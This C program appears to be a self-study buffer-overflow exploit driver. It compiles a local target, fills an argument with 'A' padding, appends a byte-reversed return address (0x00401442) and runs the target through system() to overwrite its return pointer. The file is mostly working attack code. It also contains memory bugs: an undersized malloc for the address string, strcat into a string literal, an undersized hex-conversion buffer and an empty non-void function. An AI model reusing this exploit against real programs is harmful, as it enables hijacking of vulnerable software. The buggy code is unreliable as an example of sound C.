#include <stdio.h>
#include <windows.h>

char* createBuffert(int len);
char* addressToCharsAndFlip(char* str);
void  revertedByte(char* str);
void  hexStringToASCII(char* str);

char* commandBuilder(char* command, char* args);


// argv = length of payload
int main(int argc, char** argv){

    if(argc < 2){
        printf("please add variables");
        return EXIT_FAILURE;
    }
    int length = atoi(argv[1]);

    printf("creating target.....");
    system("gcc ./BufferOverflow.c -o target");
    printf("done!\n");

    char* buffer;
    char command[50] = "target.exe ";
    char end[2] = "\n";
    char* returnPtr = malloc(8);
    buffer = createBuffert(length);
    printf("buffert: %s\n", buffer);
    strcpy(returnPtr, "0x00401442");
    returnPtr = addressToCharsAndFlip(returnPtr);

    char* finishedCommandString = malloc(sizeof(command) + (sizeof(char) * length) + (sizeof(char) * 8) + sizeof(end));
    strcpy(finishedCommandString, command);
    strcat(finishedCommandString, buffer);
    strcat(finishedCommandString, returnPtr);
    strcat(finishedCommandString, end);

    printf("final command: %s\n", finishedCommandString);
    system(finishedCommandString);

    //free Memory
    free(finishedCommandString);
    free(buffer);

    return EXIT_SUCCESS;
}


char* commandBuilder(char* command, char* args){

}


char* createBuffert(int len){
    char* str = malloc(len + 1);
    if(str == NULL)
        return NULL;
    memset(str, 'A', len);
    str[len] = '\0';
    return str;
}

char* addressToCharsAndFlip(char* str){
    if ( str[1] == 'x' && strlen(str) == 10){
        memmove(str, str+2, 8);
        str[8] = '\0';
    }
    revertedByte(str);
    hexStringToASCII(str);

    return str;
}

void revertedByte(char* str){
    int i, len;
    char tmp;
    len = strlen(str);

    if(len % 2 != 0){
        str = strcat("0", str);
        len++;
    }

    for (i = 0; i < len; i += 2)
    {
        tmp = str[i];
        str[i] = str[i+1];
        str[i+1] = tmp;
    }
    
    strrev(str);
}

void hexStringToASCII(char* str){
    int i, hexValue;
    int numChars = strlen(str);
    char* tmp = malloc(numChars/2);

    for (i = 0; i < numChars; i += 2)
    {
        sscanf(&str[i], "%2x", &hexValue);
        tmp[i/2] = (char) hexValue;
    }
    tmp[i/2] = '\0';
    strcpy(str, tmp);
}